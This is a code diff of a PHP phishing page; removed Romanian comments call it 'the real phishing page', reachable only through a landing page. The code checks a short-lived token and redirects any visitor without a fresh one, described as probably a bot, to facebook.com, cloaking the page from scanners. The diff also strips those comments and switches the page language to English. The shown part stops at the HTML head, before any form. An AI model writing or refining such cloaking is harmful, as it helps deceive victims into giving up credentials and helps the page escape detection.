@@ -1,28 +1,21 @@
 <?php
-// phish.php - Pagina reală de phishing
-// Doar oamenii care trec de landing.php ajung aici
-
 $token = $_GET['token'] ?? '';
 $verify = $_GET['verify'] ?? 0;
 
-// Verifică dacă token-ul e valid (a venit de la landing.php)
 if (empty($token) || $verify == 0) {
-    // Acces direct fără token - probabil bot
     header('Location: https://www.facebook.com');
     exit;
 }
 
-// Verifică dacă token-ul nu e prea vechi (maxim 30 secunde)
 $token_time = explode('_', $token)[0];
 if (time() * 1000 - $token_time > 30000) {
-    // Token expirat
     header('Location: https://www.facebook.com');
     exit;
 }
 ?>
 
 <!DOCTYPE html>
-<html lang="ro">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
